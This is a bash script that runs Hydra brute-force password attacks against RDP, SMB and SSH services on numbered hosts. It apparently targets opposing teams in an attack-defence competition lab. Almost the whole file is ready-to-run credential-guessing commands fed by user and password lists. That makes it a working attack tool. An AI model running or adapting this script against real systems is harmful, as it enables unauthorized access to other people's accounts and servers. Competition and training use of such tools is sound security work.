#!/bin/bash

# Check if correct number of arguments are supplied (3 arguments expected)
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <Team number> <Domain> <Resource directory>"
    echo "Example: $0 13 pvp.swift ./resources"
    echo "Note: ./resources must contain 'userlist' and 'passlist' subdirectories."
    exit 1
fi

TARGET="$1"
DOMAIN="$2"
RESOURCE="$3"

# Check if password and user directories exist
if [ ! -d "$RESOURCE/passlist" ]; then
    echo "[-] Error: Password directory not found at $RESOURCE/passlist."
    exit 1
fi

if [ ! -d "$RESOURCE/userlist" ]; then
    echo "[-] Error: User directory not found at $RESOURCE/userlist."
    exit 1
fi

echo "[*] Starting Hydra brute-force against team $TARGET for thehouse and sunflower"
echo "--------------------------------------------------"

# Run Hydra against RDP for Server 2019 and Server 2022
hydra -t 1 -V -f -L "$RESOURCE/userlist/sunflower" -P "$RESOURCE/passlist/sunflower" rdp://172.16.$TARGET.51
hydra -t 1 -V -f -L "$RESOURCE/userlist/thehouse" -P "$RESOURCE/passlist/thehouse" rdp://172.16.$TARGET.52

echo "[*] Starting Hydra SMB brute-force against team $TARGET"
echo "--------------------------------------------------"

# Run Hydra against SMB for Server 2019 (Fixed duplicate -L flag)
hydra -t 1 -V -f -L "$RESOURCE/userlist/sunflower" -P "$RESOURCE/passlist/sunflower" -m "$DOMAIN" smb://172.16.$TARGET.51

# Define the target IP for SSH (adjust the final octet '.53' if your lab uses a different IP)
TARGET_IP="172.16.$TARGET.53"

echo "[*] Starting Hydra SSH brute-force against $TARGET_IP"
echo "--------------------------------------------------"

# Run Hydra against SSH
hydra -t 1 -V -f -L "$RESOURCE/userlist/peashooter" -P "$RESOURCE/passlist/peashooter" ssh://$TARGET_IP